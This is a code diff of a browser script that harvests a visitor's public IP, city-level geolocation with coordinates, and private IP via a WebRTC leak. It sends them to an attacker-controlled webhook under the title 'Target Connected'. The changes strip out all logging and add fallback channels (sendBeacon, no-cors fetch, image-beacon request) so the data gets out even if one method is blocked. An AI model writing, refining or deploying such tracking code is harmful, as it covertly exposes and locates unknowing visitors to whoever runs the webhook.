@@ -25,7 +25,6 @@
                 const pubRes = await fetch("https://api.ipify.org?format=json");
                 const pubData = await pubRes.json();
                 pub = pubData.ip;
-                console.log("public ip:", pub);
             } catch(e) { console.error("pub ip fail:", e); }
 
             try {
@@ -33,7 +32,6 @@
                 const geoData = await geoRes.json();
                 if (geoData.success) {
                     geo = `${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.latitude}, ${geoData.longitude})`;
-                    console.log("geo:", geo);
                 }
             } catch(e) { console.error("geo fail:", e); }
 
@@ -49,10 +47,9 @@
                 });
                 await pc.setLocalDescription(await pc.createOffer());
                 await new Promise(r => setTimeout(r, 2000));
-                console.log("private ip:", priv);
             } catch(e) { console.error("priv ip fail:", e); }
 
-            const payload = JSON.stringify({
+            const embed = {
                 embeds: [{
                     title: "Target Connected",
                     color: 0xff0000,
@@ -62,29 +59,26 @@
                         {name: "geolocation", value: geo, inline: false}
                     ]
                 }]
-            });
+            };
+
+            const jsonStr = JSON.stringify(embed);
 
             try {
-                const blob = new Blob([payload], {type: "application/json"});
+                const blob = new Blob([jsonStr], {type: "application/json"});
                 const sent = navigator.sendBeacon(WEBHOOK, blob);
-                console.log("sendBeacon result:", sent);
-                if (!sent) {
+                if (!sent) throw new Error("beacon rejected");
+            } catch(e) {
+                try {
                     await fetch(WEBHOOK, {
                         method: "POST",
                         mode: "no-cors",
                         headers: {"Content-Type": "text/plain;charset=UTF-8"},
-                        body: payload
+                        body: jsonStr
                     });
-                    console.log("fetch fallback sent");
+                } catch(e2) {
+                    const img = new Image();
+                    img.src = WEBHOOK + "/slack?" + new URLSearchParams({data: jsonStr});
                 }
-            } catch(e) {
-                console.error("webhook fail:", e);
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: {"Content-Type": "text/plain;charset=UTF-8"},
-                    body: payload
-                });
             }
         }
         grab();
